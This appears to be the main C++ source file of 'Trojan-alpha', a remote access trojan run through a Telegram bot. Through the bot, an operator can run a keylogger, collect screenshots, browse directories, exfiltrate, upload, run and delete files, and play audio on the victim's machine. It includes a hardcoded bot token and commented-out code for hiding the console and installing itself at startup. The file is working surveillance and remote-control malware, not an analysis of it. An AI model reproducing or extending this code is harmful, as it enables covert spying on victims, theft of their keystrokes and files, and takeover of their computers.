#include <iostream>
#include <tgbot/tgbot.h>
#include <filesystem>

#include "keyLogger.h"
#include "globals.h"
#include "console.h"
#include "startup.h"
#include "conversions.h"
#include "screenshot.h"
#include "modes.h"


// Main function
void startBot(std::string token)
{
	using namespace std;
	namespace fs = std::filesystem;

	TgBot::Bot bot(token);


	bot.getEvents().onCommand("start", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id,
				std::string("Hello, welcome to Trojan-alpha. Here's the commands you can use:\n")
				+ "/start_key_logger - starts key logger;\n"
				+ "/kill_key_logger - kills key logger;\n"
				+ "/send_scr - makes and sends screenshot;\n"
				+ "/send_key_logger - sends a file with key logs;\n"
				+ "/check_dir_mode - opens check directory mode;\n"
				+ "/full_check_dir_mode - opens full check directory mode;\n"
				+ "/start_file_mode - opens start file mode;\n"
				+ "/delete_file_mode - opens delete file mode;\n"
				+ "/copy_file_mode - opens copy file mode;\n"
				+ "/send_file_mode - opens send file mode;\n"
				+ "/upload_file_mode - opens upload file mode;\n"
				+ "/play_music_mode - opens play music mode;\n"
				+ "/stop_music - stops music;\n"
				+ "/exit_mode - exits your current mode.\n");
			bot.getApi().sendMessage(message->chat->id, "ChatID: " + std::to_string(message->chat->id));
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");

		});


	bot.getEvents().onCommand("start_key_logger", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			int64_t chat_id = message->chat->id;

			bot.getApi().sendMessage(chat_id, "Starting Key Logger.");
			isKeyLoggerRunning = true;

			thread keyLogger(startKeyLogger, std::ref(bot), chat_id);
			keyLogger.detach();
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("kill_key_logger", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			isKeyLoggerRunning = false;
			bot.getApi().sendMessage(message->chat->id, "Killing current key_logger session.");
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode");
		});


	bot.getEvents().onCommand("send_key_logger", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			ifstream inFile(filename);

			if (!inFile) {
				bot.getApi().sendMessage(message->chat->id, "Error: Cannot open file!");
				return;
			}

			if (inFile.peek() == std::ifstream::traits_type::eof())
				bot.getApi().sendMessage(message->chat->id, "The file is empty.");
			else
				bot.getApi().sendDocument(message->chat->id, TgBot::InputFile::fromFile(filename, "text/plain"));
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");

		});


	bot.getEvents().onCommand("send_scr", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{	
			try {
				takeScreenshot(scrname);
				TgBot::InputFile::Ptr document = TgBot::InputFile::fromFile(scrname, "image/bmp");

				bot.getApi().sendDocument(message->chat->id, document);

				if (fs::remove(scrname))
					bot.getApi().sendMessage(message->chat->id, "Screenshot has been successfully deleted.");
				else
					bot.getApi().sendMessage(message->chat->id, "Cannot delete the screenshot.");
			}
			catch (const std::exception& e) {
				bot.getApi().sendMessage(message->chat->id, std::string("Error: ") + e.what());
			}
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("check_dir_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
			currentMode = MODE_CHECK_DIR;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("full_check_dir_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
			currentMode = MODE_FULL_CHECK_DIR;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("start_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to start.");
			currentMode = MODE_START_FILE;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("delete_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to delete.");
			currentMode = MODE_DELETE_FILE;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("copy_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to copy.");
			currentMode = MODE_COPY_FILE;
			isWaitingForSecondPath = true;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("send_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to download.");
			currentMode = MODE_SEND_FILE;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("upload_file_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a file you want to upload.");
			currentMode = MODE_UPLOAD_FILE;
			isWaitingForFile = true;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	bot.getEvents().onCommand("play_music_mode", [&bot](TgBot::Message::Ptr message) {
		if (currentMode == MODE_STANDARD)
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path to mp3 you want to play.");
			currentMode = MODE_PLAY_MUSIC;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});


	/*bot.getEvents().onCommand("conversation_mode", [&bot](TgBot::Message::Ptr message) {

		if (currentMode == MODE_STANDARD)
		{
			ShowConsole();
			isConversationRunning = true;
			thread listenThread(listenMode, ref(bot), message->chat->id);
			listenThread.detach();
			currentMode = MODE_CONVERSATION;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
		});*/


	bot.getEvents().onCommand("stop_bot", [&bot](TgBot::Message::Ptr message) {
		exit(0);
		});

	// ALL messages from the user are processed here FIRST.
	bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {

		// This command is here for easement.
		if (message->text == "/exit_mode") {
			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode.");
			currentMode = MODE_STANDARD;
			HideConsole();
			isConversationRunning = false;
			return;
		}


		else if (message->text == "/stop_music") {
			if (isMusicPlaying)
			{
				try {
					mciSendString(L"close myMP3", NULL, 0, NULL);
					bot.getApi().sendMessage(message->chat->id, "Music has been successfully stopped.");
				}
				catch (const std::exception& e) {
					bot.getApi().sendMessage(message->chat->id, string("Error: ") + e.what());
				}
			}
			else
				bot.getApi().sendMessage(message->chat->id, "Music is not playing right now.");
			return;
		}


		switch (currentMode) 
		{
		case MODE_CHECK_DIR:
			checkDir(bot, message);
			break;
		case MODE_FULL_CHECK_DIR:
			fullCheckDir(bot, message);
			break;
		case MODE_START_FILE:
			startFile(bot, message);
			break;
		case MODE_DELETE_FILE:
			deleteFile(bot, message);
			break;
		case MODE_COPY_FILE:
			copyFile(bot, message);
			break;
		case MODE_SEND_FILE:
			sendFile(bot, message);
			break;
		case MODE_UPLOAD_FILE:
			uploadFile(bot, message);
			break;
		case MODE_PLAY_MUSIC:
			playMusic(bot, message);
			break;
		}

		});


	try {
		printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
		bot.getApi().sendMessage(sashaId, "TgBot has been launched.");
		TgBot::TgLongPoll longPoll(bot);
		while (true) {
			longPoll.start();
		}
	}
	catch (TgBot::TgException& e) {
		printf("error: %s\n", e.what());
	}
}

int main()
{
	setlocale(LC_ALL, "Russian");
	//HideConsole();

	//AddToStartup(L"System", L"path\\to\\your\\program.exe");

	startBot("6507971490:AAEFE5H4m1KJvJwUXFDgM4cVHSSwTXx0uiU");

	return 0;
}
